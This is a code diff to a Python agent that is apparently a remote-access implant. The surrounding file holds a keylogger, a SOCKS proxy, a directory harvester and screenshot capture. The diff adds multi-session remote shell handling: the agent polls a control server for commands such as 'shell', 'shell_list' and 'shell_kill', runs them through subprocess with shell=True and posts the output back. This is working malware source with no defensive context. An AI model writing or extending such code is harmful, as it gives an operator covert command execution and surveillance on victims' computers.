@@ -14,6 +14,8 @@ import string
 import keyboard
 from threading import Timer
 from datetime import datetime
+import queue
+import shlex
 
 import pyautogui
 from io import BytesIO
@@ -32,6 +34,56 @@ if platform.system() == 'Windows':
 	import win32evtlogutil
 
 from directoryHarvester import DirectoryHarvester
+
+def enqueue_output(out, queue):
+	#for line in iter(out.readline, ''):
+	#	print("Read from output: " + line)
+	#	queue.put(line)
+	while True:
+		line = out.readline()
+		if not line:
+			break
+		#queue.put(str(line, 'utf-8'))
+		queue.put(line)    
+	out.close()
+
+class SubProcessManager(Thread):
+	def __init__(self, subprocessId):  
+		Thread.__init__(self)
+		self.currentProcess = None;
+		self.subprocessId = subprocessId
+		self.inQueue = queue.Queue()
+		self.outQueue = queue.Queue()
+		self.stayAlive = True;
+		self.lastCommand = None
+
+	def run(self):
+		while(self.stayAlive):
+			if not self.inQueue.empty():
+				newInput = self.inQueue.get()
+				if self.currentProcess == None or not self.currentProcess.poll() == None:
+					self.currentProcess = subprocess.Popen(shlex.split(newInput), shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True)
+					self.currentOutputThread = Thread(target=enqueue_output, args=(self.currentProcess.stdout, self.outQueue))
+					self.currentOutputThread.start()
+					self.lastCommand = newInput
+				else:
+					self.currentProcess.stdin.write(newInput + "\n")
+					self.currentProcess.stdin.flush()
+			time.sleep(0.05)        
+		if not self.currentProcess == None:
+			self.currentProcess.kill()
+
+	def kill(self):
+		self.stayAlive = False
+    
+	def getCurrentProcessStr(self):
+		if self.currentProcess == None:
+			return "No Process"
+		elif not self.currentProcess == None and not self.currentProcess.poll() == None:
+			return self.lastCommand + " exited with code " + str(self.currentProcess.poll())
+		else:
+			return self.lastCommand
+
 
 class SocksProxyLoop(Thread):
 	def __init__(self, daemon, remote_socket, proxy_id):
@@ -228,6 +280,10 @@ class Keylogger:
 class LocalAgent:
 	harvester_server = '127.0.0.1'
 	harvester_port = 8010
+
+	shellIdCounter = 0
+	sessionsDict = {}
+	currentSessionId = None
 
 	def __init__(self):
 		self.daemonUID = self.makeUID();
@@ -452,10 +508,83 @@ class LocalAgent:
 
 	def pollCommand(self):
 		response = self.pollServer()
+
+		if response == "shell_background":
+			self.currentSessionId = None
+			self.postResponse("Proceeding in main shell")
+			return None		
+		elif response == "shell_kill":
+			if self.currentSessionId and self.currentSessionId in self.sessionsDict:
+				self.sessionsDict[self.currentSessionId].kill()
+				del self.sessionsDict[self.currentSessionId]
+				self.currentSessionId = None
+				self.postResponse("Session Destroyed")
+			else:
+				self.postResponse("No current session")
+			return None
+		elif not self.currentSessionId == None:
+			if not response == '<control> No Command':
+				self.sessionsDict[self.currentSessionId].inQueue.put(response)
+			output = None
+			try:
+				while True:
+					tmp_output = self.sessionsDict[self.currentSessionId].outQueue.get_nowait()
+					if output == None:
+						output = tmp_output
+					else:
+						output = output + tmp_output
+			except queue.Empty as e:
+				n=1
+			if output:
+				self.postResponse(output)
+			return None    
+
 		if response == '<control> No Command':
 			return None
+		elif response == "shell":
+			self.currentSessionId = str(self.shellIdCounter)
+			self.shellIdCounter += 1
+			self.sessionsDict[self.currentSessionId] = SubProcessManager(self.currentSessionId)
+			self.sessionsDict[self.currentSessionId].start()
+			self.postResponse("Shell Launched: " + self.currentSessionId)
+			return None
+		elif response == "shell_list":
+			if len(self.sessionsDict) == 0:
+				self.postResponse("No shells active")
+			else:    
+				val = "Sessions available: \n"
+				for key in self.sessionsDict:
+					val = val + "Shell " + key + ": " + self.sessionsDict[key].getCurrentProcessStr() + "\n";
+				self.postResponse(val)
+			return None                            
+		elif response.startswith("shell_kill "):
+			#Kill one of the shells
+			elements = response.split(" ")
+			if not len(elements) == 2:
+				self.postResponse("shell_kill <session id>")
+			else:
+				if elements[1] in self.sessionsDict:
+					self.sessionsDict[str(elements[1])].kill()
+					del self.sessionsDict[str(elements[1])]
+					self.postResponse("Session destroyed: " + str(elements[1]))
+				else:
+					self.postResponse("Session not available")            
+			return None                    
+		elif response.startswith("shell "):
+			#Specify shell to switch to
+			elements = response.split(" ")
+			if not len(elements) == 2:
+				self.postResponse("shell <session id>")
+			else:
+				if str(elements[1]) in self.sessionsDict:
+					self.currentSessionId = str(elements[1])
+					self.postResponse("Active Session: " + self.currentSessionId)
+				else:
+					self.postResponse("Session not available")
+			return None        
 		elif response == "get_daemon_start_cmd":
 			self.postResponse(self.getDaemonStartupCmd())
+			return None
 		elif response.startswith("<control> download "):
 			elements = response.split(" ")
 			if len(elements) >= 4:
@@ -652,3 +781,5 @@ class LocalAgent:
 			except Exception as e:
 				live = False
 				print("Shutting down {}".format(e), file=sys.stderr)
+		for key in self.sessionsDict:
+			self.sessionsDict[key].kill()
